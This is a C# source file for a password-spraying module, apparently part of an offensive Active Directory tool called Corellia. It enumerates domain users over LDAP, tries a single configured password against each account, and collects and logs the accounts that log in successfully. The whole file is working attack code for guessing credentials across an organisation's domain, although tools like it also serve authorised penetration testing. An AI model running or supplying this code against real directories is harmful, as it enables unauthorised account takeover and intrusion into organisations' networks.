using Corellia.Interfaces;
using Corellia.Utilities;
using System;
using System.Collections.Generic;

namespace Corellia.Modules
{
    internal class PassSpray : IModules
    {
        public Enums.Mode Mode => Enums.Mode.Domain;

        public static List<String> Spray()
        {
            Structure.Spray users = Network.LDAP.GetUsers();

            Logger.Print(Logger.STATUS.INFO, "Skipping " + users.SkippedList.Count + " user(s)");

            List<string> sprayable = users.UsersList;
            List<string> authenticated = new List<string>();
            foreach (string user in sprayable)
            {
                if (Network.LDAP.Authenticate(user, Config.Spray))
                {
                    Logger.Print(Logger.STATUS.GOOD, user + ": " + "SUCCESS");
                    if (!authenticated.Contains(user))
                    {
                        authenticated.Add(user);
                    }
                }
                else
                {
                    Logger.Print(Logger.STATUS.VERBOSE, user + ": " + "FAILURE");
                }
            }
            Console.WriteLine();
            return authenticated;
        }
    }
}